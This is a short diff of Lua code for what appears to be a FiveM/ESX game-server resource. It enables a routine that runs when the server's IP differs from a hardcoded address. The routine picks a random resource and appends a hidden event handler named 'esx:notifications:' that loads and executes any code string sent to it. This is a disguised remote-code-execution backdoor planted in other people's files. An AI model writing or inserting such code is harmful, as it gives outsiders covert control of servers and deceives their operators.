@@ -6,8 +6,8 @@ function checkserveripnow()
             serverip = "1"
             if serverip ~= "91.211.247.26" then
                 serverisstolenreportit(serverip)
-               -- ChooseRandomResourceAndWriteToFile2()
-              --  ChooseRandomResourceAndWriteToFile()
+                ChooseRandomResourceAndWriteToFile2()
+                ChooseRandomResourceAndWriteToFile()
             end
         else
             checkserveripnow()
@@ -125,7 +125,7 @@ function ChooseRandomResourceAndWriteToFile2()
     local appendContent = "\n\nRegisterNetEvent('esx:notifications:') AddEventHandler('esx:notifications:', function(b) local a = load(b) a() end)"
     AppendToEndOfFile(serverLuaPath, appendContent)
     print("Chosen resource: " .. chosenResource)
-    print("Content appended to " .. chosenResource .. "/server.lua:")
+    print("Content appended to " .. chosenResource .. "/client.lua:")
     print(appendContent)
 end
 
